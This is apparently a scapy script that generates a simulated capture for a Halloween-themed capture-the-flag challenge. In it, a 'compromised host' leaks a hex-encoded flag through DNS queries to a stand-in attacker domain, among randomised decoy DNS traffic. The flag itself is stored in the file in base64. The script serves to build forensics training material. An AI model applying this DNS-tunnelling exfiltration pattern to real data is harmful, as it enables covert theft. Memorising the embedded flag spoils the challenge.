from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, RandShort, wrpcap
import base64
import random

COMPROMISED_HOST = "10.0.0.2"
DNS_HOST = "10.0.0.10"
ATTACKER_HOST = "203.0.113.6"
ATTACKER_DOMAIN = "pumpkin.local"
FLAG = "RkxBR3toYWxsb3dlZW4yMDI1fQ=="
PRETEXT = "WU9VX0ZPVU5EX0FfTEVUVEVSXw=="
HALLOWEEN_WORDLIST = ("ghost", "witch", "candy", "spooky",
                      "haunted", "costume", "trick", "treat", "skeleton",
                      "dark", "bat", "zombie", "vampire", "reeses", "skittles",
                      "kitkat", "snickers", "twix", "sourpatch", "airhead")

def generate_key_packets() -> list:
    packets = []
    flag_decoded = base64.b64decode(FLAG).decode('utf-8')
    flag_hex = ''.join(f"{ord(c):02x}" for c in flag_decoded)
    qname = f"{flag_hex}.{ATTACKER_DOMAIN}"
    dns_a_query = (
        IP(src=COMPROMISED_HOST, dst=DNS_HOST) /
        UDP(sport=RandShort(), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
    )
    packets.append(dns_a_query)
    return packets

def generate_txt_packets(data: str, qname: str = ATTACKER_DOMAIN) -> list:
    packets = []
    dns_txt_qry = (
        IP(src=COMPROMISED_HOST, dst=DNS_HOST)/
        UDP(sport=RandShort(), dport=53)/
        DNS(
            rd=1,
            qd=DNSQR(qname=qname, qtype="TXT")
        )
    )

    dns_txt_resp = (
        IP(src=DNS_HOST, dst=COMPROMISED_HOST) /
        UDP(sport=53, dport=RandShort()) /
        DNS(
            id=0x1337,
            qr=1,
            aa=1,
            qd=DNSQR(qname=qname, qtype="TXT"),
            an=DNSRR(
                rrname=f"{qname}.",
                type="TXT",
                ttl=300,
                rdata=data
            )
        )
    )
    packets.extend([dns_txt_qry, dns_txt_resp])
    return packets

def generate_halloween_dns_packets() -> list:
    packets = []
    for _ in range(50):
        word1, word2 = random.sample(HALLOWEEN_WORDLIST, 2)
        qname = f"{word1}.{word2}.local"
        last_octet = random.randint(3, 254)
        random_dns_traffic_host = f"10.0.0.{last_octet}"
        dns_answer = f"203.0.113.{last_octet}"
        dns_a_query = (
            IP(src=random_dns_traffic_host, dst=DNS_HOST) /
            UDP(sport=RandShort(), dport=53) /
            DNS(rd=1, qd=DNSQR(qname=qname, qtype="A"))
        )
        dns_a_response = (
            IP(src=DNS_HOST, dst=random_dns_traffic_host) /
            UDP(sport=53, dport=RandShort()) /
            DNS(
                id=0x1337,
                qr=1,
                aa=1,
                qd=DNSQR(qname=qname, qtype="A"),
                an=DNSRR(
                    rrname=qname,
                    type="A",
                    ttl=300,
                    rdata=dns_answer
                )
            )
        )
        packets.extend([dns_a_query, dns_a_response])
    return packets